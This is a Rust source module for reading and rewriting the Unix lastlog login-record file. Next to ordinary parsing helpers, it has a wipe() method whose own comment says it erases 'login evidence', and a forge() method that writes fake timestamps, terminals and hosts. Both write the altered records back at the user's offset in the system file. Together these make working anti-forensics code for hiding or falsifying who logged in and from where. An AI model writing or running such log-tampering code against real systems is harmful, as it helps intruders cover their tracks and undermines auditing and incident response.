/// lastlog binary record handling.
///
/// struct lastlog:
///   ll_time: u32    (4 bytes)  - timestamp
///   ll_line: [u8; 32]          - terminal
///   ll_host: [u8; 256]         - hostname/IP
///   Total: 292 bytes
///
/// Indexed by UID: record for UID N starts at offset N * 292.

use std::fs;
use std::io::{self, Write, Seek, SeekFrom};

pub const LASTLOG_RECORD_SIZE: usize = 292;

#[derive(Debug, Clone)]
pub struct LastlogRecord {
    pub uid: u32,
    pub raw: [u8; LASTLOG_RECORD_SIZE],
}

impl LastlogRecord {
    pub fn timestamp(&self) -> u32 {
        u32::from_le_bytes([self.raw[0], self.raw[1], self.raw[2], self.raw[3]])
    }

    pub fn line(&self) -> String {
        extract_string(&self.raw[4..36])
    }

    pub fn host(&self) -> String {
        extract_string(&self.raw[36..292])
    }

    pub fn timestamp_str(&self) -> String {
        let ts = self.timestamp() as i64;
        if ts == 0 {
            return "never".to_string();
        }
        chrono::DateTime::from_timestamp(ts, 0)
            .map(|dt| dt.format("%Y-%m-%d %H:%M:%S").to_string())
            .unwrap_or_else(|| format!("{}", ts))
    }

    pub fn is_empty(&self) -> bool {
        self.timestamp() == 0
    }

    /// Zero the entire record (wipe login evidence for this UID).
    pub fn wipe(&mut self) {
        for b in &mut self.raw { *b = 0; }
    }

    /// Overwrite with a fake timestamp, terminal, and host.
    pub fn forge(&mut self, timestamp: u32, line: &str, host: &str) {
        self.wipe();
        let ts_bytes = timestamp.to_le_bytes();
        self.raw[0..4].copy_from_slice(&ts_bytes);

        let line_bytes = line.as_bytes();
        let len = line_bytes.len().min(31);
        self.raw[4..4 + len].copy_from_slice(&line_bytes[..len]);

        let host_bytes = host.as_bytes();
        let len = host_bytes.len().min(255);
        self.raw[36..36 + len].copy_from_slice(&host_bytes[..len]);
    }
}

fn extract_string(bytes: &[u8]) -> String {
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    String::from_utf8_lossy(&bytes[..end]).to_string()
}

/// Read all non-empty lastlog records.
pub fn read_records(path: &str) -> io::Result<Vec<LastlogRecord>> {
    let data = fs::read(path)?;
    let mut records = Vec::new();

    for (uid, chunk) in data.chunks_exact(LASTLOG_RECORD_SIZE).enumerate() {
        let mut raw = [0u8; LASTLOG_RECORD_SIZE];
        raw.copy_from_slice(chunk);
        records.push(LastlogRecord { uid: uid as u32, raw });
    }

    Ok(records)
}

/// Write a single record at the correct UID offset.
pub fn write_record_at_uid(path: &str, uid: u32, record: &LastlogRecord) -> io::Result<()> {
    let offset = (uid as u64) * (LASTLOG_RECORD_SIZE as u64);
    let mut file = fs::OpenOptions::new().write(true).open(path)?;
    file.seek(SeekFrom::Start(offset))?;
    file.write_all(&record.raw)?;
    Ok(())
}
